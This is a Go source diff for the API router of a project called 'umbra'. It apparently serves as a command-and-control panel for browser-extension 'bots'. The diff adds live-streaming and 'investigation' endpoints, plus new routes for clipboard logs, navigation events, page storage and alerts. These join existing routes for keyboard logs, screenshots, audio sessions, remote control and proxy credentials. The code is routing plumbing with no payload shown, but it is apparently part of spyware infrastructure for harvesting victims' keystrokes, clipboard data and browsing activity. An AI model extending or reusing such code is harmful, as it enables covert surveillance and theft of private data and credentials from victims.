@@ -11,6 +11,7 @@ import (
 
 	"github.com/s045pd/umbra/internal/auth"
 	"github.com/s045pd/umbra/internal/crxsign"
+	"github.com/s045pd/umbra/internal/live"
 )
 
 // Deps groups all collaborators the API server needs.
@@ -18,6 +19,7 @@ type Deps struct {
 	DB               *gorm.DB
 	Sessions         *auth.Manager
 	BotRPC           BotRPC
+	LiveHub          *live.Hub
 	BrowserSnapshots BrowserSnapshotService
 	BcryptRounds     int
 	GUIDistPath      string
@@ -40,9 +42,10 @@ func NewRouter(d Deps) http.Handler {
 	r.Use(auth.CORS)
 
 	authAPI := &AuthAPI{DB: d.DB, Sessions: d.Sessions, BcryptRounds: d.BcryptRounds}
-	botsAPI := &BotsAPI{DB: d.DB, RPC: d.BotRPC}
+	botsAPI := &BotsAPI{DB: d.DB, RPC: d.BotRPC, Hub: d.LiveHub}
 	settingsAPI := &SettingsAPI{DB: d.DB}
 	mediaAPI := &MediaAPI{DB: d.DB}
+	investigationAPI := &InvestigationAPI{DB: d.DB}
 	remoteAPI := &RemoteAPI{DB: d.DB, RPC: d.BotRPC}
 	proxyAPI := &ProxyCredsAPI{DB: d.DB, RPC: d.BotRPC}
 	extensionAPI := &ExtensionAPI{Signer: d.ExtSigner, PublicURL: d.PublicURL}
@@ -95,7 +98,10 @@ func NewRouter(d Deps) http.Handler {
 			r.Get("/api/v1/bots", botsAPI.List)
 			r.Get("/api/v1/bots/{bot_id}", botsAPI.Get)
 			r.Post("/api/v1/bots/{bot_id}/live", botsAPI.Live)
+			r.Get("/api/v1/bots/{bot_id}/live-stream", botsAPI.LiveStream)
 			r.Get("/api/v1/bots/{bot_id}/snapshot", botsAPI.Snapshot)
+			r.Get("/api/v1/bots/{bot_id}/timeline", investigationAPI.Timeline)
+			r.Get("/api/v1/bots/{bot_id}/page-storage", investigationAPI.PageStorage)
 			r.Put("/api/v1/bots", botsAPI.Update)
 			r.Delete("/api/v1/bots", botsAPI.Delete)
 			r.Post("/api/v1/bots/batch-delete", botsAPI.BatchDelete)
@@ -116,6 +122,12 @@ func NewRouter(d Deps) http.Handler {
 			r.Get("/api/v1/screenshots", mediaAPI.Screenshots)
 			r.Get("/api/v1/screenshots/{id}/image", mediaAPI.ScreenshotImage)
 			r.Get("/api/v1/keyboard-logs", mediaAPI.KeyboardLogs)
+			r.Get("/api/v1/clipboard-logs", mediaAPI.ClipboardLogs)
+			r.Get("/api/v1/nav-events", investigationAPI.NavEvents)
+			r.Get("/api/v1/search", investigationAPI.Search)
+			r.Get("/api/v1/alerts", investigationAPI.Alerts)
+			r.Get("/api/v1/alerts/unacked-count", investigationAPI.UnackedCount)
+			r.Post("/api/v1/alerts/{id}/ack", investigationAPI.AckAlert)
 			r.Get("/api/v1/recordings", mediaAPI.Recordings)
 			r.Get("/api/v1/audio-sessions", mediaAPI.AudioSessions)
 			r.Get("/api/v1/audio-session/{session_id}", mediaAPI.AudioSessionMerge)
